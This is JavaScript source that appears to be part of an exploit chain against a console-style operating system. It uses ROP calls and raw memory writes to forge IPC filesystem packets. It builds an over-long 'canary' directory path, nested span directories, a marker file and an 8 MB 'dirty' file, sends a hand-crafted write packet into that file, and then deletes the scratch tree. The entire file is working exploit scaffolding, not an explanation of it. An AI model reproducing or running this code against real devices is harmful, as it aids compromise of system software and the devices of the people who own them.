function normalizedPath(prefix, length) {
    var text = prefix;
    while (text.length < length) {
        var remaining = length - text.length;
        if (remaining === 1) {
            text += "A";
        } else {
            text += "/" + "A".repeat(Math.min(32, remaining - 1));
        }
    }
    return text;
}

function createScratchTree(handle, config) {
    var logs = [];
    var canaryLen = config.canaryLength || 1440;
    var dirtySize = config.dirtyFileSize || 8388608;
    var segments = config.spanSegments || [ "S0A", "S1A", "S2A" ];
    var salt = Number(call_rop(F_Tick) & 0xFFFFFFn).toString(16);
    var canaryPath = normalizedPath(config.scratchDir + "/" + salt + "_canary", canaryLen);
    logs.push("canary path length=" + canaryPath.length + " (target " + canaryLen + ")");
    var rootRc = ipcCreateDirectory(handle, config.scratchDir);
    var parts = canaryPath.slice(1).split("/");
    var mkOk = 0, mkErr = 0, mkSamples = [];
    for (var i = 2; i < parts.length; i++) {
        var path = "/" + parts.slice(0, i).join("/");
        var rc = ipcCreateDirectory(handle, path);
        if (rc === 0 || (rc & 4194303) === 1026) mkOk++; else {
            mkErr++;
            if (mkSamples.length < 3) mkSamples.push("i=" + i + ",len=" + path.length + ",rc=0x" + rc.toString(16));
        }
    }
    var canaryRc = ipcCreateFile(handle, canaryPath, 1);
    logs.push("canary mkdir=" + mkOk + "/" + (parts.length - 2) + " err=" + mkErr + " root=" + hex32(rootRc) + " errors=[" + mkSamples.join("; ") + "]" + " create=" + hex32(canaryRc));
    var spanDirs = [ config.scratchDir ];
    var running = config.scratchDir;
    for (var i = 0; i < segments.length; i++) {
        running += "/" + segments[i];
        spanDirs.push(running);
    }
    var spanOk = 0;
    for (var i = 0; i < spanDirs.length; i++) {
        var rc = ipcCreateDirectory(handle, spanDirs[i]);
        if (rc === 0 || (rc & 4194303) === 1026) spanOk++;
    }
    var markerPath = running + "/SPAN_MARKER";
    var markerRc = ipcCreateFile(handle, markerPath, 1);
    logs.push("span mkdir=" + spanOk + "/" + spanDirs.length + " marker=" + hex32(markerRc));
    var selectedDir = config.scratchDir + "/selected";
    var selRc = ipcCreateDirectory(handle, selectedDir);
    logs.push("selected=" + hex32(selRc) + " ready=" + (selRc === 0));
    var dirtyFilePath = config.scratchDir + "/big8";
    var dfRc = ipcCreateFile(handle, dirtyFilePath, dirtySize);
    logs.push("dirty file=" + hex32(dfRc) + " size=0x" + dirtySize.toString(16));
    return {
        ok: rootRc === 0 && canaryRc === 0 && markerRc === 0 && dfRc === 0,
        canaryPath: canaryPath,
        dirtyFilePath: dirtyFilePath,
        markerPath: markerPath,
        selectedDir: selectedDir,
        selectedReady: selRc === 0,
        spanSegments: segments,
        logs: logs
    };
}

function writeDirtyData(handle, dirtyFilePath, dirtyFileSize, writeBuf, writePkt) {
    var writer = ipcOpenFile(handle, dirtyFilePath, 3);
    if (!writer) return false;
    prepPacket(writePkt, (4 | 1 << 20) >>> 0, 14, []);
    write32(writePkt + 8n, BigInt(dirtyFileSize));
    write32(writePkt + 12n, BigInt(Number(writeBuf & 0xFFFFFFFFn)));
    write32(writePkt + 16n, BigInt((1 | Number(writeBuf >> 36n & 7n) << 2 | Number(writeBuf >> 32n & 15n) << 28) >>> 0));
    write32(writePkt + 0x20n, 0x49434653n);
    write32(writePkt + 0x28n, 1n);
    write32(writePkt + 0x30n, 0n);
    write64(writePkt + 0x38n, 0n);
    write64(writePkt + 0x40n, BigInt(dirtyFileSize));
    sendIPC(writer, writePkt);
    var result = cmifReply(writePkt).result;
    closeHandle(writer);
    return result === 0;
}

function removeScratchTree(handle, scratchDir) {
    var removeResult = ipcDeleteDirectoryRecursively(handle, scratchDir);
    var commitResult = ipcCommit(handle);
    return {
        remove: removeResult,
        commit: commitResult
    };
}
